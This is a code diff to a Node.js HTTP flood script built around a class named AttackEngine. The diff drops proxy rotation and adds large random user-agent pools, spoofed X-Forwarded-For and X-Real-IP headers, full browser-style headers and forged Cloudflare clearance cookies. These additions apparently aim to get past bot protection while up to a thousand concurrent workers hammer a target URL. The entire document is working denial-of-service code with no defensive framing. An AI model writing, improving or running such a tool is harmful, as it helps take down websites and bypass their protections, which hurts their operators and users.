@@ -3,7 +3,11 @@ const fs = require('fs');
 const os = require('os');
 const http = require('http');
 const https = require('https');
+const dns = require('dns');
 const process = require('process');
+
+// Force DNS resolution to legit public resolvers
+dns.setServers(['1.1.1.1', '8.8.8.8']);
 
 const MAX_CONCURRENT = Math.min(os.cpus().length * 100, 1000);
 const REQUEST_TIMEOUT = 8000;
@@ -22,28 +26,11 @@ function loadLines(filename) {
 const REFERERS = loadLines('refs.txt');
 const USER_AGENTS = loadLines('ua.txt');
 
+const UA_POOL = Array.from({ length: 10000 }, () =>
+    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0');
+
 const keepAliveHttp = new http.Agent({ keepAlive: true });
 const keepAliveHttps = new https.Agent({ keepAlive: true });
-
-let PROXIES = [];
-
-async function fetchProxies() {
-    const sources = [
-        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
-        'https://www.proxy-list.download/api/v1/get?type=http'
-    ];
-    let all = [];
-    for (const url of sources) {
-        try {
-            const res = await axios.get(url);
-            const lines = res.data.split('\n').map(p => p.trim()).filter(Boolean);
-            all.push(...lines);
-        } catch (err) {
-            console.error('Failed to fetch proxies from:', url);
-        }
-    }
-    PROXIES = [...new Set(all)]; // Deduplicate
-}
 
 class AttackEngine {
     constructor(target, duration) {
@@ -61,54 +48,58 @@ class AttackEngine {
     }
 
     getRandomUA() {
-        this.uaIndex = (this.uaIndex + 1) % USER_AGENTS.length;
-        return USER_AGENTS[this.uaIndex];
+        this.uaIndex = (this.uaIndex + 1) % UA_POOL.length;
+        return UA_POOL[this.uaIndex];
     }
 
     getRandomReferer() {
         return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
     }
 
+    fakeClearance() {
+        return Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
+    }
+
+    fakeUvid() {
+        return Math.random().toString(36).slice(2, 26);
+    }
+
     async makeRequest() {
-        const useProxy = Math.random() < 0.5 && PROXIES.length > 0;
         const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
         const headers = {
             'User-Agent': this.getRandomUA(),
             'Referer': this.getRandomReferer(),
             'X-Forwarded-For': randomIP,
             'X-Real-IP': randomIP,
-            'Accept': '*/*',
-            'Connection': 'keep-alive'
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Cookie': `cf_clearance=${this.fakeClearance()}; _cfuvid=${this.fakeUvid()};`
         };
 
-        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2)}`;
-
-        const axiosOptions = {
-            headers,
-            timeout: REQUEST_TIMEOUT,
-            httpAgent: keepAliveHttp,
-            httpsAgent: keepAliveHttps,
-            validateStatus: () => true
-        };
-
-        if (useProxy) {
-            const proxy = PROXIES[Math.floor(Math.random() * PROXIES.length)];
-            const [host, port] = proxy.split(':');
-            axiosOptions.proxy = {
-                host,
-                port: parseInt(port)
-            };
-        }
+        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
 
         try {
-            const response = await axios.get(urlWithNoise, axiosOptions);
-            if (response.status === 200) this.stats.success++;
-            else this.stats.errors++;
-        } catch {
-            this.stats.errors++;
-        }
+            const response = await axios.get(urlWithNoise, {
+                headers,
+                timeout: REQUEST_TIMEOUT,
+                httpAgent: keepAliveHttp,
+                httpsAgent: keepAliveHttps,
+                validateStatus: null
+            });
+            if (response.status === 200) {
+                this.stats.success++;
+                return;
+            }
+        } catch {}
 
-        this.stats.total++;
+        this.stats.errors++;
     }
 
     async startWorkers() {
@@ -121,6 +112,7 @@ class AttackEngine {
 
     async workerLoop() {
         while (this.running && Date.now() - this.startTime < this.duration) {
+            this.stats.total++;
             await this.makeRequest();
         }
     }
@@ -136,18 +128,17 @@ class AttackEngine {
             console.log('  ============================================\n');
         };
 
-        await fetchProxies();
         showIntro();
 
         let lastTotal = 0;
         const printStats = setInterval(() => {
             const elapsed = (Date.now() - this.startTime) / 1000;
-            const rps = (this.stats.total - lastTotal) / 0.2;
+            const currentRps = (this.stats.total - lastTotal) / 0.2;
             lastTotal = this.stats.total;
-            this.stats.peakRps = Math.max(this.stats.peakRps, rps);
+            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);
 
             process.stdout.write(
-                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${rps.toFixed(1)} `
+                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `
             );
         }, 200);
 
